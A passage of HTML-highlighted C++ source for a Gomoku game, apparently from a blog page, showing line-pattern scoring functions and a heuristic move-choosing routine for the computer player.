class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">3</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">80</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">80</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">chong4</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">3</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">60</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">60</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live3</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">2</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">70</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">70</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">death3</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">2</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">3</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">1</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">40</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">40</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">death2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">3</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">1</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">30</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">30</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AI</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b_x = <span class=\"number\">8</span>, b_y = <span class=\"number\">8</span>, w_x = <span class=\"number\">8</span>, w_y = <span class=\"number\">8</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(black, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(black));</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(white, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(white));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">15</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">15</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lian5(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (chong4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lian5(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (chong4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (black[i][j] &gt; black[b_x][b_y])b_x = i, b_y = j;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (white[i][j] &gt; white[w_x][w_y])w_x = i, w_y = j;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (black[b_x][b_y] &lt;= white[w_x][w_y])Play(w_x + <span class=\"number\">2</span>, w_y, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> Play(b_x + <span class=\"number\">2</span>, b_y, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GameAI</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> turn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tkey = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pos, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(pos));</span><br><span class=\"line\">\t<span class=\"comment\">/*setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class=\"line\"><span class=\"comment\">\tbar(10, 200, 90, 230);</span></span><br><span class=\"line\"><span class=\"comment\">\tsetcolor(EGERGB(0, 0, 255));</span></span><br><span class=\"line\"><span class=\"comment\">\tsetfont(20, 0, &quot;宋体&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\txyprintf(10, 205, &quot;玩家先手&quot;);*/</span></span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span 